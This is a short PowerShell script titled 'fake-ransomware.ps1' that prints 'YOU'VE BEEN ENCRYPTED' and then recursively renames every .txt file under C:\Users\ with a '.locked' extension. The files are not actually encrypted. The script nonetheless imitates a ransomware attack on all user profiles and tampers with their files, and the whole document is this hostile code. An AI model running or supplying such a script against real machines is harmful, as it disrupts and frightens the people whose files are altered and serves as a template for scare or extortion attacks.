# fake-ransomware.ps1
Write-Host "YOU'VE BEEN ENCRYPTED"
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt | ForEach-Object {
    Rename-Item $_.FullName "$($_.FullName).locked"
}